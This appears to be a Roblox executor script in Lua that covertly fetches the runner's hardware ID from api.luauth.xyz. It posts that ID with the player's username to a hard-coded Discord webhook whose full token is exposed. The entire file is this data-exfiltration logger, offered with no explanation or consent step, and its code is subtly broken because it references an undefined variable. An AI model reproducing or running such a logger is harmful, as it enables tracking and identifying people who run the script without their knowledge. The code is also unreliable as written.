local res = (request or http_request or syn and syn.request)({
    Url = "https://api.luauth.xyz/hwid",
    Method = "GET"
    })
local webh = "https://discord.com/api/webhooks/1025876276654907453/JByeBaQxyooQEpp4MQvgkm2dwQoeaSMoyISPJKwMlCSuix3A1dOe4C0HG0mfpDAayG0A"

pcall(function()
    local data = {
        ["embeds"] = {
            {
                ["title"] = game:GetService("Players").LocalPlayer.Name,
                ["description"] = (string.sub(res.Body, 19, index - 5))
            }
        }
    }
 
    if syn then
        local response = syn.request(
            {
                Url = webh,
                Method = 'POST',
                Headers = {
                    ['Content-Type'] = 'application/json'
                },
                Body = game:GetService('HttpService'):JSONEncode(data)
            }
        );
    elseif request then
        local response = request(
            {
                Url = webh,
                Method = 'POST',
                Headers = {
                    ['Content-Type'] = 'application/json'
                },
                Body = game:GetService('HttpService'):JSONEncode(data)
            }
        );
    elseif http_request then
        local response = http_request(
            {
                Url = webh,
                Method = 'POST',
                Headers = {
                    ['Content-Type'] = 'application/json'
                },
                Body = game:GetService('HttpService'):JSONEncode(data)
            }
        );
    end
 end)
